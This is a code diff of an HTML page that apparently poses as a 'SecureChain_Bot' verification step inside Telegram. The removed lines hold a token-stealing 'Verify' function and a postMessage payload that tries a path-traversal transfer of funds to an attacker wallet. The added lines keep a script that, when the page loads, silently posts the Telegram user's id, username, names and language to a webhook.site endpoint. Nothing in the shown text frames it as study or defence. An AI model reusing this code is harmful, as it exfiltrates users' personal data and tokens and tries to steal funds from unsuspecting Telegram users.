@@ -34,48 +34,28 @@
   <button onclick="steal()">Verify</button>
 
   <script>
-    // Send Telegram Wallet payload to opener
-    const payload = "../../../wallet/send?amount=100000&to=@attacker_wallet";
-    const message = JSON.stringify({
-      eventType: 'web_app_open_tg_link',
-      eventData: {
-        path_full: `/wallet/start?x=${encodeURIComponent(payload)}`
-      }
+  window.Telegram.WebApp.ready(); // Ensures WebApp is initialized
+
+  const tg = window.Telegram.WebApp;
+  const user = tg.initDataUnsafe?.user;
+
+  if (user) {
+    fetch("https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        telegram_id: user.id,
+        username: user.username,
+        first_name: user.first_name,
+        last_name: user.last_name,
+        lang: user.language_code,
+        source: "SecureChain_Bot WebApp"
+      })
     });
+  }
+</script>
 
-    setTimeout(() => {
-      window.opener?.postMessage(message, "*");
-      console.log("✅ postMessage payload sent.");
-    }, 1500);
-
-    // Send captured token to your webhook
-    function steal() {
-      const token = document.getElementById("token").value;
-      fetch("https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4", {
-        method: "POST",
-        headers: { "Content-Type": "text/plain" },
-        body: "Captured Token: " + token
-      });
-      alert("✅ Session verified.");
-    }
-
-    // Optional: Log Telegram user info if WebApp context is available
-    window.Telegram.WebApp.ready();
-    const tg = window.Telegram.WebApp;
-    const user = tg.initDataUnsafe?.user;
-    if (user) {
-      fetch("https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          telegram_id: user.id,
-          username: user.username,
-          first_name: user.first_name,
-          last_name: user.last_name,
-          lang: user.language_code
-        })
-      });
-    }
-  </script>
 </body>
 </html>
